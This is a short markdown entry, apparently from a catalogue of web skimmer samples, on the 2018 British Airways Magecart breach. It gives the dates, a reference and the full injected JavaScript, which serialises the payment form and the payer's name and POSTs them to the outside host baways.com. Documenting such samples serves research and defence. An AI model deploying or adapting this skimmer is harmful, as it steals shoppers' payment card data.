---
title: British Airways magecart skimmer
date: '2018-09-05'
tags:
  - web
  - supply-chain
  - magecart
  - e-skimmer
---

This payload was injected into a JavaScript resource and captured payment data before sending it to a third party URL `https://baways.com/gateway/app/dataprocessing/api` (Malicious/Dead).

The website was affected from August 21, 2018 to September 5, 2018.

- - -

## References

- [Inside the Magecart Breach of British Airways: How 22 Lines of Code Claimed 380,000 Victims](https://www.riskiq.com/blog/labs/magecart-british-airways-breach/)

## Payload

```js
window.onload = function() {
  jQuery(".submitButton").bind("mouseup touchend", function(t) {
    var n = {};    
    jQuery("#paymentForm")
      .serializeArray()
      .map(function(a) {
        n[a.name] = a.value;
      });
    var e = document.getElementById('personPaying').innerHTML;
    n.person = e;
    var t = JSON.stringify(n);
    setTimeout(function() {
      jQuery.ajax({
        type: "POST",
        async: !0,
        url: "https://baways.com/gateway/app/dataprocessing/api",
        data: t,
        dataType: "application/json"
      });
    }, 500);
  });
};
```
